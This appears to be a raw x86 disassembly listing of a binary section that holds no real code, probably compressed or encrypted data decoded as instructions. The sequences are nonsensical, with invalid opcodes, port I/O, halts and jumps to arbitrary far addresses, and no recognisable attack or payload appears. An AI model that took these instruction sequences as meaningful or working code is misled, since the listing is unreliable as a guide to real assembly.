  4266b6:	shl    BYTE PTR [ebx+esi*8],cl
  4266b9:	cmc    
  4266ba:	div    bh
  4266bc:	rcl    ah,cl
  4266be:	inc    esi
  4266bf:	pop    edi
  4266c0:	push   ebx
  4266c1:	dec    ebx
  4266c2:	mov    eax,0x198833d
  4266c7:	add    ch,dh
  4266c9:	add    BYTE PTR [eax],al
  4266cb:	add    BYTE PTR [esi],ah
  4266cd:	into   
  4266ce:	nop
  4266cf:	fdivr  DWORD PTR [ecx]
  4266d1:	ds push 0xd
  4266d4:	dec    edx
  4266d5:	jmp    0x8758:0x640e790
  4266dc:	cmc    
  4266dd:	popa   
  4266de:	cs loope 0x4266d6
  4266e1:	inc    edx
  4266e2:	scas   eax,DWORD PTR es:[edi]
  4266e3:	xchg   ebx,eax
  4266e4:	mov    eax,ds:0x8406e07e
  4266e9:	rol    BYTE PTR [ebx+0x5fae86ea],cl
  4266ef:	mov    ch,BYTE PTR [esi+0x5b0d3449]
  4266f5:	xchg   ecx,eax
  4266f6:	pop    es
  4266f7:	mov    ah,0x52
  4266f9:	out    dx,eax
  4266fa:	or     eax,0x7f81977b
  4266ff:	push   es
  426700:	fistp  WORD PTR [esp+edx*1]
  426703:	xchg   ecx,eax
  426704:	les    edi,FWORD PTR [edi+0x68afcc9c]
  42670a:	imul   ebp,DWORD PTR [ecx-0x4f],0x6b
  42670e:	add    ebp,DWORD PTR [edx-0x32]
  426711:	jmp    0x7d6b324e
  426716:	sbb    al,ah
  426718:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426719:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42671a:	mov    BYTE PTR [ebx],ah
  42671c:	add    al,0xcf
  42671e:	call   0xff7e7705
  426723:	iret   
  426724:	or     eax,0x4ccbce2f
  426729:	jmp    0x5334:0x8abfe8b1
  426730:	push   ebx
  426731:	cmc    
  426732:	imul   esp,ebp,0xffffffbb
  426735:	jge    0x426713
  426737:	dec    esi
  426738:	neg    DWORD PTR [edx-0xd]
  42673b:	sub    bh,BYTE PTR [ebx]
  42673d:	mov    WORD PTR [edx],?
  42673f:	ja     0x4266e9
  426741:	mov    bh,0x2
  426743:	hlt    
  426744:	jl     0x426750
  426746:	sti    
  426747:	pop    ecx
  426748:	ins    BYTE PTR es:[edi],dx
  426749:	or     BYTE PTR [edi],ah
  42674b:	jnp    0x4267a8
  42674d:	inc    ebp
  42674e:	xchg   ebp,eax
  42674f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426750:	cdq    
  426751:	lods   al,BYTE PTR ds:[esi]
  426752:	or     al,0xc3
  426754:	push   cs
  426755:	adc    eax,0xb6082192
  42675a:	shl    ecx,1
  42675c:	pop    eax
  42675d:	stos   DWORD PTR es:[edi],eax
  42675e:	mov    BYTE PTR [ebp*2+0x423ae102],bl
  426765:	ds inc ebp
  426767:	imul   eax,DWORD PTR [ebx-0x59],0x13
  42676b:	ja     0x426754
  42676d:	pop    edi
  42676e:	loope  0x42670a
  426770:	fmul   DWORD PTR [ebx-0x4e]
  426773:	fidivr DWORD PTR [eax-0x5a83f5fa]
  426779:	sbb    edx,DWORD PTR [edx+0x5b267043]
  42677f:	and    BYTE PTR [ebp+eax*1+0x19],0xa1
  426784:	cmp    eax,ebp
  426786:	jae    0x426722
  426788:	add    DWORD PTR ds:0x8c49561d,ebp
  42678e:	xchg   edx,eax
  42678f:	data16 je 0x42675e
  426792:	loop   0x426811
  426794:	jl     0x4267e0
  426796:	inc    eax
  426797:	pop    edi
  426798:	sbb    dl,ah
  42679a:	xor    al,BYTE PTR [eax]
  42679c:	jae    0x426754
  42679e:	mov    ds:0x78fba626,al
  4267a3:	out    dx,al
  4267a4:	and    eax,0x2fc698b3
  4267a9:	test   esi,edi
  4267ab:	mov    ebx,0xe89c34c5
  4267b0:	mov    DWORD PTR [edi],esi
  4267b2:	push   esp
  4267b3:	cli    
  4267b4:	repz sti 
  4267b6:	call   FWORD PTR [eax+0x70]
  4267b9:	outs   dx,DWORD PTR ds:[esi]
  4267ba:	cmp    DWORD PTR [ecx+0x545d7c68],ebp
  4267c0:	jnp    0x4267c2
	...
  426832:	add    BYTE PTR [eax],al
  426834:	pop    esp
  426835:	push   edx
  426836:	nop
  426837:	push   edx
  426838:	sahf   
  426839:	rcr    dh,cl
  42683b:	pop    esi
  42683c:	test   BYTE PTR [esi+edi*8+0x771e9134],cl
  426843:	jne    0x4268bd
  426845:	cdq    
  426846:	add    DWORD PTR [eax],eax
  426848:	cmc    
  426849:	add    BYTE PTR [eax],al
  42684b:	add    cl,al
  42684d:	xor    BYTE PTR [ebp+0xa],ch
  426850:	(bad)  
  426851:	adc    eax,0x5872e10e
  426856:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426857:	xor    bh,bl
  426859:	loop   0x4268bf
  42685b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42685c:	lods   al,BYTE PTR ds:[esi]
  42685d:	lahf   
  42685e:	mov    dl,0x7
  426860:	das    
  426861:	jmp    0x7f13e73e
  426866:	loope  0x4267f4
  426868:	sbb    eax,0xe7887db9
  42686d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42686e:	adc    al,0x38
  426870:	dec    ecx
  426871:	out    0xc7,eax
  426873:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426874:	mov    bl,0x21
  426876:	pop    es
  426877:	xchg   ebx,eax
  426878:	push   0x7f
  42687a:	mov    cl,0xdf
  42687c:	jo     0x4268c4
  42687e:	mov    edx,0x2f771577
  426883:	add    dl,BYTE PTR [ecx+ecx*8+0x3db47806]
  42688a:	outs   dx,BYTE PTR ds:[esi]
  42688b:	cmp    DWORD PTR [esi+0x4f],edx
  42688e:	dec    ebp
  42688f:	jne    0x426892
  426891:	mov    ebx,0x8b153567
  426896:	sub    DWORD PTR [ebx+0x7b8aebb5],eax
  42689c:	inc    eax
  42689d:	add    BYTE PTR [eax],ah
  42689f:	jo     0x426840
  4268a1:	outs   dx,DWORD PTR ds:[esi]
  4268a2:	je     0x4268e7
  4268a4:	pop    esi
  4268a5:	enter  0xd68e,0x66
  4268a9:	out    dx,al
  4268aa:	hlt    
  4268ab:	arpl   WORD PTR [ebx-0x3c33b7fc],bp
  4268b1:	push   0x6d
  4268b3:	pop    ds
  4268b4:	loope  0x4268ef
  4268b6:	(bad)  
  4268b7:	into   
  4268b8:	xor    al,BYTE PTR [esi-0x77]
  4268bb:	adc    DWORD PTR [edx-0x3e],esi
  4268be:	hlt    
  4268bf:	and    BYTE PTR [esi-0x72e9ec5e],ah
  4268c5:	xor    eax,0xafbd8ab4
  4268ca:	adc    ebp,DWORD PTR [esi]
  4268cc:	out    dx,eax
  4268cd:	push   ss
  4268ce:	stos   BYTE PTR es:[edi],al
  4268cf:	pop    ebx
  4268d0:	and    ebx,DWORD PTR [esi+edi*1-0x2d6a3e6]
  4268d7:	int3   
  4268d8:	mov    bl,0x5f
  4268da:	pop    ss
  4268db:	mov    bl,0x6d
  4268dd:	retf   
  4268de:	pop    ebx
  4268df:	imul   ebp,DWORD PTR [ebp-0xf4d9b02],0xfffffff9
  4268e6:	push   eax
  4268e7:	fnclex 
  4268e9:	pop    ds
  4268ea:	adc    BYTE PTR [ebp+0x57e3542d],dh
  4268f0:	jae    0x42688e
  4268f2:	adc    eax,0xdba4a7d1
  4268f7:	inc    esi
  4268f8:	daa    
  4268f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4268fa:	pop    ebx
  4268fb:	xor    al,0x94
  4268fd:	out    0xdd,al
  4268ff:	fidiv  DWORD PTR [eax]
  426901:	(bad)  
  426903:	inc    eax
  426904:	pop    es
  426905:	cld    
  426906:	cwde   
  426907:	xchg   ebx,eax
  426908:	sbb    eax,0x8556efdb
  42690d:	jmp    0xb2e837a8
  426912:	push   edi
  426913:	push   edi
  426914:	cs test BYTE PTR cs:[ecx-0x14],ch
  426919:	adc    DWORD PTR [ebx+0x202bb381],esp
  42691f:	jbe    0x42697f
  426921:	mov    esp,0x33569a2e
  426926:	popf   
  426927:	int3   
  426928:	clc    
  426929:	sbb    DWORD PTR [edi],ebx
  42692b:	pop    esi
  42692c:	mov    ds:0x88a6d6cd,eax
  426931:	xchg   BYTE PTR [ecx+0x60c76f29],ah
  426937:	push   ecx
  426938:	sbb    eax,0x682a0c83
  42693d:	loop   0x42694c
  42693f:	jo     0x426927
	...
  4269b1:	add    BYTE PTR [eax],al
  4269b3:	add    cl,al
  4269b5:	arpl   WORD PTR [edi+eiz*2],ax
  4269b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4269b9:	jcxz   0x4269a3
  4269bc:	jne    0x426978
  4269be:	push   ebp
  4269bf:	inc    esp
  4269c0:	mov    cl,0x6e
  4269c2:	jmp    0x1dcd796
  4269c7:	add    ch,dh
  4269c9:	add    BYTE PTR [eax],al
  4269cb:	add    BYTE PTR [edi],ah
  4269cd:	mov    cl,BYTE PTR [ebx-0x615a9708]
  4269d3:	push   ecx
  4269d4:	in     eax,dx
  4269d5:	xor    esi,eax
  4269d7:	pop    es
  4269d8:	mov    al,0xb1
  4269da:	mov    ebp,0x35e96d13
  4269df:	enter  0xf0dd,0x5f
  4269e3:	jmp    0x3c00:0xea9963eb
  4269ea:	rcl    DWORD PTR [ebx],cl
  4269ec:	test   eax,0x4f3d447b
  4269f1:	or     ebx,DWORD PTR [eax]
  4269f3:	stc    
  4269f4:	or     BYTE PTR [ecx],0xe9
  4269f7:	cmp    al,0xcf
  4269f9:	pushf  
  4269fa:	pop    es
  4269fb:	inc    edi
  4269fc:	jle    0x4269c4
  4269fe:	sbb    ah,BYTE PTR [ebx-0x3f]
  426a01:	aad    0x4d
  426a03:	loop   0x426a12
  426a05:	push   ebx
  426a06:	mov    ebx,0x140ec833
  426a0b:	sahf   
  426a0c:	(bad)  
  426a0d:	loope  0x426994
  426a0f:	pop    esi
  426a10:	retf   0xb480
  426a13:	fmul   DWORD PTR [edx-0x70]
  426a16:	ret    0x9163
  426a19:	in     al,dx
  426a1a:	out    dx,eax
  426a1b:	add    bh,BYTE PTR [esi]
  426a1d:	jge    0x4269a6
  426a1f:	pusha  
  426a20:	fstp   QWORD PTR [esi]
  426a22:	outs   dx,DWORD PTR ds:[esi]
  426a23:	push   ecx
  426a24:	mov    eax,ds:0xbaa65e46
  426a29:	mov    ecx,0x9a530ddd
  426a2e:	repnz std 
  426a30:	(bad)  
  426a31:	fwait
  426a32:	sbb    al,0x3f
  426a34:	push   ebp
  426a35:	push   ss
  426a36:	adc    eax,0x3dcd290e
  426a3b:	cmp    bh,BYTE PTR [ebx]
  426a3d:	dec    esi
  426a3e:	in     eax,0xab
  426a40:	aam    0x91
  426a42:	sahf   
  426a43:	jle    0x426a06
  426a45:	lods   eax,DWORD PTR ds:[esi]
  426a46:	push   edx
  426a47:	dec    ebp
  426a48:	dec    ebp
  426a49:	dec    ebx
  426a4a:	xchg   ebx,eax
  426a4b:	mov    BYTE PTR [ecx],al
  426a4d:	xchg   ebx,eax
  426a4e:	aad    0xee
  426a50:	jnp    0x426a99
  426a52:	out    0xd5,al
  426a54:	mov    al,0x5c
  426a56:	daa    
  426a57:	scas   eax,DWORD PTR es:[edi]
  426a58:	pushf  
  426a59:	pop    ecx
  426a5a:	test   BYTE PTR [eax-0x37],bl
  426a5d:	mov    al,0x32
  426a5f:	mov    ebp,0x8a09408b
  426a64:	std    
  426a65:	retf   
  426a66:	pop    eax
  426a67:	adc    al,0x73
  426a69:	dec    ebp
  426a6a:	and    BYTE PTR ds:0x8e45d394,bl
  426a70:	jne    0x426a4c
  426a72:	sti    
  426a73:	adc    DWORD PTR [edx+0x13],ebp
  426a76:	add    ebp,DWORD PTR [eax-0x4bd5bfe0]
  426a7c:	dec    ebp
  426a7d:	out    0x34,al
  426a7f:	cmp    dl,BYTE PTR [edi]
  426a81:	adc    BYTE PTR [edi+0x67013a11],cl
  426a87:	or     al,cl
  426a89:	enter  0xc983,0x2d
  426a8d:	jmp    0x772364f3
  426a92:	lods   eax,DWORD PTR ds:[esi]
  426a93:	imul   edx,DWORD PTR [ebx+0x38cb466c],0xffffffbd
  426a9a:	mov    esp,0x423d8a88
  426a9f:	xchg   BYTE PTR ds:0xc04d8911,ah
  426aa5:	jmp    0x6c047d47
  426aaa:	mov    eax,DWORD PTR [esi-0xa]
  426aad:	and    eax,DWORD PTR [edi+0x64423ae7]
  426ab3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426ab4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426ab5:	add    al,0xf2
  426ab7:	and    bl,BYTE PTR [edi-0x150503bf]
  426abd:	push   ecx
  426abe:	jmp    0x0:0x749b
	...
  426b31:	add    BYTE PTR [eax],al
  426b33:	add    ah,al
  426b35:	clc    
  426b36:	jnp    0x426b8e
  426b38:	jg     0x426b11
  426b3a:	in     eax,dx
  426b3b:	cli    
  426b3c:	cwde   
  426b3d:	inc    ebx
  426b3e:	mov    dh,0x90
  426b40:	mov    al,0x5a
  426b42:	push   ss
  426b43:	cld    
  426b44:	bound  ebx,QWORD PTR [ebx+0xf50001]
  426b4a:	add    BYTE PTR [eax],al
  426b4c:	in     eax,0x98
  426b4e:	dec    edx
  426b4f:	cmovae esp,DWORD PTR [edx+0x36]
  426b53:	cli    
  426b54:	sub    eax,DWORD PTR [eax+0x3e7af81f]
  426b5a:	test   eax,0xde7ba1e9
  426b5f:	test   eax,0xcec46f3d
  426b64:	ret    0xda7f
  426b67:	mov    ah,0xed
  426b69:	fstp   DWORD PTR [esp+esi*4+0x1c26ac9]
  426b70:	imul   ebx,ebx,0x69
  426b73:	add    DWORD PTR [ebp-0x35473a2a],ebx
  426b79:	jg     0x426b16
  426b7b:	xchg   DWORD PTR [edi-0x7c608769],edx
  426b81:	mov    ecx,0x863f224c
  426b86:	push   edx
  426b87:	js     0x426b11
  426b89:	mov    dh,0xdb
  426b8b:	in     al,dx
  426b8c:	dec    esp
  426b8d:	jg     0x426b5f
  426b8f:	push   edi
  426b90:	cmp    BYTE PTR [esi],0xae
  426b93:	int3   
  426b94:	test   BYTE PTR [edi+ecx*1+0x159df17],ah
  426b9b:	loopne 0x426b8a
  426b9d:	clc    
  426b9e:	and    DWORD PTR [edi-0x2a5215ff],esi
  426ba4:	pop    es
  426ba5:	scas   al,BYTE PTR es:[edi]
  426ba6:	and    DWORD PTR [eax+esi*1-0x2f],0xffffffd7
  426bab:	mov    ds:0x31975f69,al
  426bb0:	dec    edx
  426bb1:	test   DWORD PTR [eax-0x69],ebx
  426bb4:	int3   
  426bb5:	sub    al,0x5f
  426bb7:	xlat   BYTE PTR ds:[ebx]
  426bb8:	sub    esi,0x20
  426bbb:	lahf   
  426bbc:	mov    edi,0x4e4d3d82
  426bc1:	std    
  426bc2:	jp     0x426c23
  426bc4:	or     dl,bl
  426bc6:	and    eax,0x4d4fcf86
  426bcb:	retf   
  426bcc:	adc    eax,0x2eef1e17
  426bd1:	icebp  
  426bd2:	cwde   
  426bd3:	dec    ebx
  426bd4:	sub    eax,0x5c32d603
  426bd9:	or     DWORD PTR [ecx-0x3d80e36b],edi
  426bdf:	int3   
  426be0:	cmp    dl,ch
  426be2:	(bad)  
  426be3:	fstp   QWORD PTR [edi+edx*1-0x78]
  426be7:	xchg   edi,eax
  426be8:	rcr    BYTE PTR [edx-0x69f5f1ca],1
  426bee:	loope  0x426c35
  426bf0:	stos   DWORD PTR es:[edi],eax
  426bf1:	mov    ds:0x5c646eb3,al
  426bf6:	std    
  426bf7:	jno    0x426b7a
  426bf9:	cmp    BYTE PTR [eax],0x28
  426bfc:	cli    
  426bfd:	mov    esi,0x5c3cb843
  426c02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426c03:	sbb    eax,0x705ba123
  426c08:	in     al,dx
  426c09:	adc    BYTE PTR [edx],0x18
  426c0c:	adc    edx,DWORD PTR [edx-0x5c]
  426c0f:	or     DWORD PTR [esi-0x183b62e3],ecx
  426c15:	pop    ecx
  426c16:	sub    BYTE PTR [esi+ecx*4-0x16],dl
  426c1a:	arpl   WORD PTR [ebx-0x63f6ea26],bp
  426c20:	loopne 0x426c17
  426c22:	mov    edx,0x381867f4
  426c27:	int3   
  426c28:	dec    edi
  426c29:	(bad)  [edi-0x13]
  426c2c:	dec    edx
  426c2d:	sbb    al,0xcf
  426c2f:	adc    edx,DWORD PTR [esi-0x323f1ce6]
  426c35:	(bad)  
  426c37:	fldl2t 
  426c39:	push   es
  426c3a:	int3   
  426c3b:	xor    DWORD PTR [esi+0x59],esi
  426c3e:	mov    dh,0x74
  426c40:	repnz add BYTE PTR [eax],al
	...
  426cb3:	add    bh,bh
  426cb5:	lods   al,BYTE PTR ds:[esi]
  426cb6:	fadd   QWORD PTR [edi]
  426cb8:	fbstp  TBYTE PTR [edi-0x1]
  426cbb:	cld    
  426cbc:	inc    eax
  426cbd:	push   ds
  426cbe:	cdq    
  426cbf:	das    
  426cc0:	iret   
  426cc1:	shl    DWORD PTR [ecx+0xa],0x57
  426cc5:	pushf  
  426cc6:	add    DWORD PTR [eax],eax
  426cc8:	cmc    
  426cc9:	add    BYTE PTR [eax],al
  426ccb:	add    BYTE PTR [ebp+edi*4+0x4ac3ea21],bh
  426cd2:	sbb    bx,bp
  426cd5:	das    
  426cd6:	rol    DWORD PTR [edi+0x383ecb30],0x74
  426cdd:	in     al,0xe1
  426cdf:	pop    ecx
  426ce0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426ce1:	sbb    al,BYTE PTR [edi-0x877dc95]
  426ce7:	cli    
  426ce8:	cmp    al,bl
  426cea:	fmul   DWORD PTR [ecx-0x45]
  426ced:	je     0x426cbe
  426cef:	sub    BYTE PTR [edi+0x5d],dl
  426cf2:	mov    al,ds:0x9e45e5ec
  426cf7:	std    
  426cf8:	test   eax,0xb14acb20
  426cfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426cfe:	sub    al,0x8b
  426d00:	adc    BYTE PTR [edx-0x22687cfa],0x42
  426d07:	xchg   ebx,esi
  426d09:	lods   eax,DWORD PTR ds:[esi]
  426d0a:	push   eax
  426d0b:	pop    ss
  426d0c:	inc    edi
  426d0d:	shl    DWORD PTR [ebx],cl
  426d0f:	movd   DWORD PTR [eax-0x76],mm0
  426d13:	dec    ebx
  426d14:	ins    BYTE PTR es:[edi],dx
  426d15:	jl     0x426d54
  426d17:	std    
  426d18:	sahf   
  426d19:	popa   
  426d1a:	fsub   st(7),st
  426d1c:	ins    BYTE PTR es:[di],dx
  426d1e:	aad    0xc
  426d20:	shl    DWORD PTR [esi-0x66c6ee18],cl
  426d26:	push   cs
  426d27:	dec    ecx
  426d28:	addr16 mov es,edx
  426d2b:	push   ss
  426d2c:	test   DWORD PTR [esi-0x3b],0xd2d804c2
  426d33:	call   0xe12b:0xec28826a
  426d3a:	push   esp
  426d3b:	or     al,0x55
  426d3d:	inc    ecx
  426d3e:	inc    ecx
  426d3f:	js     0x426db4
  426d41:	add    eax,0x701f4bd8
  426d46:	sbb    DWORD PTR [edx],esp
  426d48:	mov    ecx,0xf2e4b3e7
  426d4d:	push   0x21600b1a
  426d52:	pop    ebp
  426d53:	ins    DWORD PTR es:[edi],dx
  426d54:	clc    
  426d55:	jns    0x426d89
  426d57:	dec    edi
  426d58:	lock hlt 
  426d5a:	clc    
  426d5b:	pop    edx
  426d5c:	jp     0x426d3f
  426d5e:	xchg   BYTE PTR ds:0x5dfaa5d3,dl
  426d64:	mov    dh,BYTE PTR [ebx+0x2e84918b]
  426d6a:	sub    BYTE PTR [ecx+ebx*4],dl
  426d6d:	loopne 0x426d3d
  426d6f:	cmp    al,0x0
  426d71:	add    DWORD PTR [ebx+0x17],0xcbc0c7de
  426d78:	mov    al,0x74
  426d7a:	sbb    cl,al
  426d7c:	or     BYTE PTR es:[edi-0x78f369a7],0x4
  426d84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426d85:	shl    BYTE PTR [eax+0x64],cl
  426d88:	pop    ebx
  426d89:	jge    0x426d77
  426d8b:	and    al,0xf
  426d8d:	push   esp
  426d8e:	xor    cl,BYTE PTR [ebp+edi*8+0x52c7c43b]
  426d95:	mov    dl,0x93
  426d98:	sbb    ah,al
  426d9a:	push   ecx
  426d9b:	pop    edi
  426d9c:	mov    eax,DWORD PTR [edi+edx*2-0x1f884773]
  426da3:	jb     0x426db2
  426da5:	fild   DWORD PTR [eax-0x74]
  426da8:	xchg   ebp,eax
  426da9:	dec    esi
  426daa:	outs   dx,DWORD PTR ds:[esi]
  426dab:	ja     0x426db2
  426dad:	cmp    eax,0xeadc9b67
  426db2:	sbb    al,0x59
  426db4:	icebp  
  426db5:	xchg   esp,eax
  426db6:	in     al,dx
  426db7:	cs cmc 
  426db9:	push   0x631e564a
  426dbe:	add    al,0x36
  426dc0:	in     al,dx
	...
  426e31:	add    BYTE PTR [eax],al
  426e33:	add    dh,al
  426e35:	jl     0x426e88
  426e37:	sar    bl,1
  426e39:	std    
  426e3a:	(bad)  
  426e3b:	jle    0x426df9
  426e3d:	(bad)  
  426e3e:	loop   0x426e84
  426e40:	fdiv   DWORD PTR [edx-0x12]
  426e43:	pop    ds
  426e44:	dec    esp
  426e45:	popf   
  426e46:	add    DWORD PTR [eax],eax
  426e48:	cmc    
  426e49:	add    BYTE PTR [eax],al
  426e4b:	add    bh,cl
  426e4d:	xor    al,0x67
  426e4f:	pop    edi
  426e50:	lds    ebp,FWORD PTR [edx+edx*2]
  426e53:	mov    WORD PTR [eax+0x7],cs
  426e56:	xchg   ebx,eax
  426e57:	add    ah,dl
  426e59:	mov    ah,0x34
  426e5b:	(bad)  
  426e5c:	repz ja 0x426e78
  426e5f:	in     eax,dx
  426e60:	inc    ebx
  426e61:	jo     0x426e07
  426e63:	jne    0x426eca
  426e65:	pusha  
  426e66:	pop    ss
  426e67:	mov    al,0xf6
  426e69:	pop    es
  426e6a:	xor    BYTE PTR [ebp+0x11f59524],0x2f
  426e71:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426e73:	xor    BYTE PTR [ebx-0x5acaa8f8],dl
  426e79:	btc    DWORD PTR [ecx+0x791b8e7a],esp
  426e80:	and    al,0x37
  426e82:	daa    
  426e83:	jmp    0x13af9d54
  426e88:	inc    eax
  426e89:	clc    
  426e8a:	(bad)  es:[ecx+0x34aa42df]
  426e91:	sbb    esi,esp
  426e93:	inc    edi
  426e94:	push   0xfa6c0806
  426e99:	sub    ch,BYTE PTR [ebp+0xa3fbb1f]
  426e9f:	mov    esp,0xed2a370c
  426ea4:	inc    edx
  426ea5:	mov    dl,BYTE PTR [esp+edx*2-0x1dd59aca]
  426eac:	mov    ch,0xf
  426eae:	cmc    
  426eaf:	shl    ebx,0xdf
  426eb2:	into   
  426eb3:	or     eax,DWORD PTR [ebp-0x3]
  426eb6:	scas   al,BYTE PTR es:[edi]
  426eb7:	jb     0x426e4d
  426eb9:	add    eax,0x93f8ff5b
  426ebe:	aaa    
  426ebf:	jb     0x426eea
  426ec1:	cmp    BYTE PTR [eax+0x1e],0xdb
  426ec5:	jp     0x426edc
  426ec7:	les    ecx,FWORD PTR [edx]
  426ec9:	dec    ebp
  426eca:	shl    DWORD PTR [eax-0x32390def],0x8f
  426ed1:	fsub   st(6),st
  426ed3:	xchg   esp,eax
  426ed4:	sbb    ah,BYTE PTR [esi]
  426ed6:	sbb    DWORD PTR [esi],0x3aec55ea
  426edc:	push   eax
  426edd:	pop    ds
  426ede:	cmp    bh,BYTE PTR [eax]
  426ee0:	xor    esi,DWORD PTR [eax-0x6e2e44c8]
  426ee6:	xchg   ecx,eax
  426ee7:	cmc    
  426ee8:	mov    ebp,0x42caec
  426eed:	pop    ecx
  426eee:	pushf  
  426eef:	mul    DWORD PTR [edi+0x51]
  426ef2:	cdq    
  426ef3:	xchg   esp,eax
  426ef4:	mov    dl,0x80
  426ef6:	(bad)  
  426ef7:	add    eax,0x4375621a
  426efc:	push   edi
  426efd:	test   eax,0xc316acd0
  426f02:	inc    ebx
  426f03:	inc    esp
  426f04:	and    ebx,DWORD PTR [ebp+0x3a6b56d9]
  426f0a:	ins    DWORD PTR es:[edi],dx
  426f0b:	mov    bh,BYTE PTR [edx+0x67831ba8]
  426f11:	inc    eax
  426f12:	dec    edi
  426f13:	(bad)  
  426f14:	clc    
  426f15:	lods   eax,DWORD PTR ds:[esi]
  426f16:	retf   
  426f17:	mov    dh,0x60
  426f19:	or     BYTE PTR [ecx],dh
  426f1b:	cmp    eax,0xeb06f7e0
  426f20:	aam    0xa4
  426f22:	xchg   BYTE PTR [ebx+ecx*2],dl
  426f25:	dec    esi
  426f26:	mov    eax,ds:0xca293675
  426f2b:	enter  0x18e1,0x1e
  426f2f:	neg    BYTE PTR [edi]
  426f31:	sbb    BYTE PTR [edi+0x6fda3877],0x60
  426f38:	or     ah,BYTE PTR [edx+eiz*1+0x572e079c]
  426f3f:	les    eax,FWORD PTR [eax+0x0]
	...
  426fb2:	add    BYTE PTR [eax],al
  426fb4:	cmp    DWORD PTR [eax-0x6854f9f5],ebx
  426fba:	cmp    eax,0xcc7989bf
  426fbf:	pop    ebx
  426fc0:	arpl   WORD PTR [ecx-0x61be6a06],bp
  426fc6:	add    DWORD PTR [eax],eax
  426fc8:	cmc    
  426fc9:	add    BYTE PTR [eax],al
  426fcb:	add    BYTE PTR [ebp+0x56],dl
  426fce:	enter  0x58d0,0xff
  426fd2:	cmp    esi,ecx
  426fd4:	int3   
  426fd5:	popw   ss
  426fd7:	mov    esp,0x9d22efb0
  426fdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426fdd:	push   esi
  426fde:	adc    DWORD PTR [ecx-0x64dbb2eb],eax
  426fe4:	mov    bl,0xd3
  426fe6:	jnp    0x427011
  426fe8:	inc    eax
  426fe9:	dec    ecx
  426fea:	and    al,0xec
  426fec:	sbb    dl,dh
  426fee:	mov    ds:0xef961ce8,eax
  426ff3:	mov    al,ds:0x7bee5f4c
  426ff8:	dec    eax
  426ff9:	mov    ecx,0x45543725
  426ffe:	xor    eax,0xe697bf08
  427003:	sti    
  427004:	mov    ch,0x76
  427006:	mov    al,ds:0x454b0cf7
  42700b:	push   ds
  42700c:	mov    ebx,0x507bb594
  427011:	into   
  427012:	dec    eax
  427013:	or     BYTE PTR [ebp-0x6],bl
  427016:	dec    ebx
  427017:	stc    
  427018:	stos   BYTE PTR es:[edi],al
  427019:	mov    cl,0x55
  42701b:	test   BYTE PTR [ebp+0x3439ecae],cl
  427021:	mov    esi,0x1f9e2c9e
  427026:	test   al,0x41
  427028:	sbb    ebp,ebx
  42702a:	lods   al,BYTE PTR ds:[esi]
  42702b:	xchg   ebx,eax
  42702c:	out    0xd6,eax
  42702e:	loope  0x427034
  427030:	std    
  427031:	jg     0x427019
  427033:	ss ja  0x426ff9
  427036:	pop    ecx
  427037:	sub    DWORD PTR ds:0xa65d6c02,edi
  42703d:	inc    edi
  42703e:	sbb    al,0xde
  427040:	icebp  
  427041:	leave  
  427042:	ret    0xe44
  427045:	xor    bh,ah
  427047:	pop    ebx
  427048:	jmp    0xa978be31
  42704d:	lock (bad) 
  42704f:	pusha  
  427050:	gs iret 
  427052:	inc    eax
  427053:	retf   
  427054:	or     DWORD PTR ds:0x9b144ae8,esp
  42705a:	ins    BYTE PTR es:[edi],dx
  42705b:	push   edx
  42705c:	test   BYTE PTR [ebp-0x65cd643e],dh
  427062:	stc    
  427063:	test   DWORD PTR [eax-0x46],esp
  427066:	dec    edx
  427067:	and    BYTE PTR [ebx],dh
  427069:	inc    edi
  42706a:	mov    ds:0xf8046296,al
  42706f:	xor    eax,0x6e2aca9
  427074:	inc    ebx
  427075:	xchg   ebx,eax
  427076:	aaa    
  427077:	xchg   ebp,eax
  427078:	push   0x1d
  42707a:	stos   DWORD PTR es:[edi],eax
  42707b:	aas    
  42707c:	sub    eax,0xdfebba32
  427081:	leave  
  427082:	fs mov bl,0x90
  427085:	jp     0x4270f5
  427087:	int3   
  427088:	jmp    0xdff7:0x49860602
  42708f:	xor    al,0x8b
  427091:	iret   
  427092:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427093:	pop    esp
  427094:	mov    bh,0x7a
  427096:	bound  ecx,QWORD PTR [eax-0x38]
  427099:	xchg   ebx,eax
  42709a:	mov    esi,0x157444a3
  42709f:	repnz pop esi
  4270a1:	mov    esi,0x260b22e9
  4270a6:	scas   eax,DWORD PTR es:[edi]
  4270a7:	and    esp,DWORD PTR [ecx-0x48f3e71b]
  4270ad:	inc    edi
  4270ae:	fild   WORD PTR ds:0x6bf6ecd6
  4270b4:	mov    WORD PTR [edx+0x25],cs
  4270b7:	jmp    0x42710c
  4270b9:	sub    eax,0x582c8214
  4270be:	dec    esp
  4270bf:	cmp    ch,BYTE PTR [esi+0x0]
	...
  427132:	add    BYTE PTR [eax],al
  427134:	fwait
  427135:	and    DWORD PTR [edi],ecx
  427137:	popa   
  427138:	mov    edi,0xcefbff6f
  42713d:	aad    0x24
  42713f:	aam    0x6e
  427141:	or     ebp,DWORD PTR [edi+0x77]
  427144:	ss lahf 
  427146:	add    DWORD PTR [eax],eax
  427148:	cmc    
  427149:	add    BYTE PTR [eax],al
  42714b:	add    dl,al
  42714d:	sub    bh,BYTE PTR [ebp-0x6df8156f]
  427153:	cli    
  427154:	inc    ebx
  427155:	mov    ebx,DWORD PTR [ebp-0x56]
  427158:	dec    ebx
  427159:	into   
  42715a:	mov    ah,0x81
  42715c:	push   0xffffffd0
  42715e:	sti    
  42715f:	xchg   ebp,eax
  427160:	mov    cl,0xe8
